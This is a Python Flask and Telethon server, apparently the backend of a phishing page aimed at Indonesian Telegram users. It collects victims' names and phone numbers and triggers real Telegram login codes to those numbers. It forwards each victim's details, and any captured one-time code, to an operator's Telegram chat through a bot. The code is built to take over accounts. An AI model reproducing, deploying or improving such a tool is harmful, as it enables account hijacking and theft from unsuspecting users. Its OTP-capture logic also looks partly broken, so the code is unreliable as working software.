import os, requests, asyncio, re
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

user_sessions = {}  # Simpan StringSession & Hash
active_monitors = {} # Lacak pesan "Siap menerima OTP"

def bot_api(method, payload):
    return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()

@app.route('/register', methods=['POST'])
def register():
    return asyncio.run(handle_register(request.json))

async def handle_register(data):
    try:
        raw_nomor = data.get('nomor', '').strip().replace(" ", "")
        nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
        nama = data.get('nama', 'User')

        client = TelegramClient(StringSession(""), int(API_ID), API_HASH)
        await client.connect()

        if data.get('step') == 1:
            res = await client.send_code_request(nomor)
            user_sessions[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama}
            
            # Log pertama kali
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"monitor_{nomor}"}]]}
            })
            # Jalankan monitor otomatis untuk pendaftaran pertama
            asyncio.create_task(otp_auto_monitor(nomor))
            
            await client.disconnect()
            return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if "callback_query" in update:
        call = update["callback_query"]
        action = call["data"]
        nomor = action.split("_")[1]

        if action.startswith("monitor_"):
            # Panah kedua: "Bot siap menerima OTP!"
            res = bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": "Bot siap menerima OTP!",
                "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
            })
            active_monitors[nomor] = res.get("result", {}).get("message_id")
            # Minta kode baru ke Telegram & pantau
            asyncio.run(request_new_otp(nomor))

        elif action.startswith("exit_"):
            # Panah ketiga: Hapus status & beri notifikasi keluar
            if nomor in active_monitors:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_monitors[nomor]})
                active_monitors.pop(nomor)
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})

    return jsonify({"status": "success"}), 200

async def request_new_otp(nomor):
    data = user_sessions.get(nomor)
    if data:
        client = TelegramClient(StringSession(data["session"]), int(API_ID), API_HASH)
        await client.connect()
        await client.send_code_request(nomor)
        await client.disconnect()
        asyncio.create_task(otp_auto_monitor(nomor))

async def otp_auto_monitor(nomor):
    data = user_sessions.get(nomor)
    if not data: return
    
    client = TelegramClient(StringSession(data["session"]), int(API_ID), API_HASH)
    await client.connect()
    
    @client.on(events.NewMessage(from_users=777000))
    async def handler(event):
        otp = re.search(r'\b\d{5}\b', event.raw_text)
        if otp:
            # OTP terdeteksi! Update log utama
            bot_api("sendMessage", {
                "chat_id": CHAT_ID,
                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{otp.group(0)}`",
                "parse_mode": "Markdown",
                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"monitor_{nomor}"}]]}
            })
            # Hapus teks "Bot siap menerima" otomatis
            if nomor in active_monitors:
                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": active_monitors[nomor]})
                active_monitors.pop(nomor)
            await client.disconnect()

    await asyncio.sleep(300) # Monitor 5 menit
    await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))